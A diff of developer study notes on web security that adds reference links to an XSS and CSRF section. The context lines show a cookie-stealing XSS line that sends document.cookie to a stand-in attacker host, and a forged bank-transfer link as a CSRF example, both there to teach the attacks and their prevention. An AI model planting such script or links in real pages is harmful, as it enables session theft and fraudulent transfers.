@@ -87,7 +87,11 @@ app.use(morgan('combined')); // or 'tiny'
   
 ### XSS & CSRF
 
-* XSS: Cross Site Scripting
+* https://www.hacksplaining.com/exercises/xss-stored
+* https://www.hacksplaining.com/exercises/csrf
+* https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP
+* https://developer.mozilla.org/en-US/docs/Web/HTTP/Cookies
+* **XSS**: Cross Site Scripting
   * Whenever an Application includes untrusted data in a new Web page without proper validation or escaping
   * Updating a Web page with User supplied data using JS
   * Allows Attacker to execute scripts in a victim's browser
@@ -99,7 +103,7 @@ window.location = 'haxxed.com?cookie=' + document.cookie
 // Send the cookie from your browser
 ```
   * To prevent this, sanitize the inputs
-* CSRF: Cross Site Request Forgery
+* **CSRF**: Cross Site Request Forgery
   * Create a bad url that has malicious code in it
 ```js
 <a href="http://netbank.com/transfer.do?acct=AttackerA&amount=100">Read more!</a>
